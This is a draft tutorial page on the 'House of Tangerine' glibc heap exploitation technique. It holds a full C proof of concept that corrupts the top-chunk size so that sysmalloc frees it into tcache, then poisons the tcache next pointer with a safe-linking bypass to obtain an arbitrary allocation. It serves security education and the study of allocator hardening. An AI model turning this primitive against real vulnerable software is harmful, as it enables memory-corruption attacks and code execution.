#import "../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Tangerine",
    description: "A modernized version of House of Orange that corrupts the heap without calling free() directly, utilizing _int_free on the top chunk in sysmalloc and tcache poisoning.",
    date: "2025-12-27",
    order: 37,
    draft: true,
  ),
)<frontmatter>

= glibc Allocator: House of Tangerine

== Introduction

The *House of Tangerine* is a modernized version of the House of Orange technique. It allows for heap corruption without the need to call `free()` directly.

It exploits `sysmalloc` to trigger `_int_free` on the top chunk (wilderness). By combining this with tcache poisoning, it can trick `malloc` into returning an arbitrary pointer.

This technique is effective on recent GLIBC versions (tested on 2.34 and 2.39).

== Example from `house_of_tangerine.c`

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)

#define CHUNK_HDR_SZ (SIZE_SZ*2)
// same for x86_64 and x86
#define MALLOC_ALIGN 0x10L
#define MALLOC_MASK (-MALLOC_ALIGN)

#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)

// fencepost are offsets removed from the top before freeing
#define FENCEPOST (2*CHUNK_HDR_SZ)

#define PROBE (0x20-CHUNK_HDR_SZ)

// size used for poisoned tcache
#define CHUNK_SIZE_1 0x40
#define SIZE_1 (CHUNK_SIZE_1-CHUNK_HDR_SZ)

// could also be split into multiple lower size allocations
#define CHUNK_SIZE_3 (PAGESIZE-(2*MALLOC_ALIGN)-CHUNK_SIZE_1)
#define SIZE_3 (CHUNK_SIZE_3-CHUNK_HDR_SZ)

/**
 * Tested on GLIBC 2.34 (x86_64, x86 & aarch64) & 2.39 (x86_64, x86 & aarch64)
 *
 * House of Tangerine is the modernized version of House of Orange
 * and is able to corrupt heap without needing to call free() directly
 *
 * it uses the _int_free call to the top_chunk (wilderness) in sysmalloc
 * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
 *
 * tcache-poisoning is used to trick malloc into returning a malloc aligned arbitrary pointer
 * by abusing the tcache freelist. (requires heap leak on and after 2.32)
 *
 * this version expects a positive and negative OOB (e.g. BOF)
 * or a positive OOB in editing a previous chunk
 *
 * This version requires 5 (6*) malloc calls and 3 OOB
 *
 *  *to make the PoC more reliable we need to malloc and probe the current top chunk size,
 *  this should be predictable in an actual exploit and therefore, can be removed to get 5 malloc calls instead
 *
 * Special Thanks to pepsipu for creating the challenge "High Frequency Troubles"
 * from Pico CTF 2024 that inspired this exploitation technique
 */
int main() {
  size_t size_2, *top_size_ptr, top_size, new_top_size, freed_top_size, vuln_tcache, target, *heap_ptr;
  char win[0x10] = "WIN\0WIN\0WIN\0\x06\xfe\x1b\xe2";
  // disable buffering
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // check if all chunks sizes are aligned
  assert((CHUNK_SIZE_1 & MALLOC_MASK) == CHUNK_SIZE_1);
  assert((CHUNK_SIZE_3 & MALLOC_MASK) == CHUNK_SIZE_3);

  puts("Constants:");
  printf("chunk header = 0x%lx\n", CHUNK_HDR_SZ);
  printf("malloc align = 0x%lx\n", MALLOC_ALIGN);
  printf("page align = 0x%lx\n", PAGESIZE);
  printf("fencepost size = 0x%lx\n", FENCEPOST);
  printf("size_1 = 0x%lx\n", SIZE_1);

  printf("target tcache top size = 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_SIZE_1);

  // target is malloc aligned 0x10
  target = ((size_t) win + (MALLOC_ALIGN - 1)) & MALLOC_MASK;

  // probe the current size of the top_chunk,
  // can be skipped if it is already known or predictable
  heap_ptr = malloc(PROBE);
  top_size = heap_ptr[(PROBE / SIZE_SZ) + 1];
  printf("first top size = 0x%lx\n", top_size);

  // calculate size_2

  size_2 = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_SIZE_1;
  size_2 &= PAGE_MASK;
  size_2 &= MALLOC_MASK;


  printf("size_2 = 0x%lx\n", size_2);

  // first allocation
  heap_ptr = malloc(size_2);

  // use BOF or OOB to corrupt the top_chunk
  top_size_ptr = &heap_ptr[(size_2 / SIZE_SZ) - 1 + (MALLOC_ALIGN / SIZE_SZ)];

  top_size = *top_size_ptr;

  printf("first top size = 0x%lx\n", top_size);

  // make sure corrupt top size is page aligned, generally 0x1000
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
  new_top_size = top_size & PAGE_MASK;
  *top_size_ptr = new_top_size;
  printf("new first top size = 0x%lx\n", new_top_size);

  // remove fencepost from top_chunk, to get size that will be freed
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  assert(freed_top_size == CHUNK_SIZE_1);

  /*
   * malloc (larger than available_top_size), to free previous top_chunk using _int_free.
   * This happens inside sysmalloc, where the top_chunk gets freed if it can't be merged
   * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
   * we prevent the top_chunk from being merged by lowering its size
   * we can also circumvent corruption checks by keeping PAGE_MASK bits unchanged
   */

  printf("size_3 = 0x%lx\n", SIZE_3);
  heap_ptr = malloc(SIZE_3);

  top_size = heap_ptr[(SIZE_3 / SIZE_SZ) + 1];
  printf("current top size = 0x%lx\n", top_size);

  // make sure corrupt top size is page aligned, generally 0x1000
  new_top_size = top_size & PAGE_MASK;
  heap_ptr[(SIZE_3 / SIZE_SZ) + 1] = new_top_size;
  printf("new top size = 0x%lx\n", new_top_size);

  // remove fencepost from top_chunk, to get size that will be freed
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  printf("freed top_chunk size = 0x%lx\n", freed_top_size);

  assert(freed_top_size == CHUNK_SIZE_1);

  // this will be our vuln_tcache for tcache poisoning
  vuln_tcache = (size_t) &heap_ptr[(SIZE_3 / SIZE_SZ) + 2];

  printf("tcache next ptr: 0x%lx\n", vuln_tcache);

  // free the previous top_chunk
  heap_ptr = malloc(SIZE_3);

  // corrupt next ptr into pointing to target
  // use a heap leak to bypass safe linking (GLIBC >= 2.32)
  heap_ptr[(vuln_tcache - (size_t) heap_ptr) / SIZE_SZ] = target ^ (vuln_tcache >> 12);

  // allocate first tcache (corrupt next tcache bin)
  heap_ptr = malloc(SIZE_1);

  // get arbitrary ptr for reads or writes
  heap_ptr = malloc(SIZE_1);

  // proof that heap_ptr now points to the same string as target
  assert((size_t) heap_ptr == target);
  puts((char *) heap_ptr);
}
```

== Attack Flow Explained

=== 1. Extend the Top Chunk

The attack starts by extending the top chunk using `malloc()`. We determine `size_2` such that the remaining top chunk ends at a page boundary. This is crucial because when the top chunk is extended, the new size must still align with page boundaries.

=== 2. Corrupting the Top Chunk Size

We use a Heap Buffer Overflow (or other OOB access) to overwrite the size field of the current top chunk. We modify the size to be smaller than the actual available space, but crucially, we keep the page alignment bits intact to pass `sysmalloc` checks.

By reducing the top chunk size, we trick `sysmalloc` into thinking there isn't enough space to satisfy the next allocation request.

=== 3. Triggering `_int_free` via `sysmalloc`

When we request an allocation larger than our corrupted top chunk size (but smaller than the actual available memory), `malloc` calls `sysmalloc` to extend the heap.

Inside `sysmalloc`, if the top chunk cannot be merged or extended simply, the old top chunk is freed using `_int_free`. Since we manipulated the size of this "old" top chunk, `_int_free` will place it into a bin (tcache or unsorted bin depending on size).

In this technique, we carefully calculate the size so that the freed top chunk fits into a *tcache bin*.

=== 4. Tcache Poisoning on the Freed Top Chunk

After triggering the free, the old top chunk is now in a tcache bin. However, since it was the top chunk, it resides in memory that we can still access or is adjacent to our previous allocations.

We can now exploit this by overwriting the `next` pointer of this tcache chunk (which is now just a free chunk in the tcache list). We point it to our target address (e.g., a stack variable, a hook, or a return address).

=== 5. Arbitrary Allocation

We perform a few more allocations:
1. One allocation to take the valid chunk (the old top chunk) out of the tcache head.
2. The next allocation will return the corrupted `next` pointer we injected.

This grants us an arbitrary write primitive at the target address.
